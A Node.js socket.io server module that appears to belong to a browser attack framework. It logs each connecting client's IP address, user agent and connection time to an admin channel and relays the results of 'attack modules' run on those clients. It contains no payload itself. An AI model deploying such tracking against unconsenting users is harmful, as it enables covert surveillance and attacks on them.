const socketio = require('socket.io')
const adminSocket = require('../admin/sockets');
const fs = require('fs');

const sockets = [];
//id for sockets which we increment. This should eventually be stored in a database
let id = 0;

module.exports.listen = function(app){

  const io = socketio.listen(app);

  io.on('connection', function(socket){
    
    console.log('a user connected');

    //store the id number of the socket on it in a new property
    socket._id = id++;

    socket.join('users');
    
    //on new user connection, send info to admin
    const newUser = module.exports.buildNewUser(socket);
    adminSocket.emit('newUser', newUser);

    sockets.push(newUser);

    //when an attack module has finished running. Relay it back to the admins
    socket.on('result', function(data){
      module.exports.result(data,socket);
    });

    //when user disconnects, let admin know
    socket.on('disconnect', function(){
      module.exports.disconnect(socket);
      console.log("user disconnected");
    });

  });

  return io;
};

module.exports.buildNewUser = function(socket){

  const clientIp = socket.handshake.address;
  const clientAgent = socket.handshake.headers['user-agent'];
  
  return {
    id: socket._id,
    socketId: socket.id,
    //address is in the form ::ffff:000.000.000.000
    ip: clientIp.slice(clientIp.lastIndexOf(':') + 1),
    agent: clientAgent.slice(clientAgent.indexOf('(') + 1,clientAgent.indexOf(')')),
    connectedAt: new Date(socket.handshake.time)
  };
};

module.exports.disconnect = function(socket){
  adminSocket.emit('userLeft', {
    id: socket._id
  });

  //remove socket from active sockets array
  for(let i = 0; i < sockets.length; i++){
    if(sockets[i].id === socket._id){
      sockets.splice(i,1);
    }
  };
};

module.exports.result = function(result, socket){
  result.id = socket._id;
  adminSocket.emit('result', result);
};

module.exports.sockets = sockets;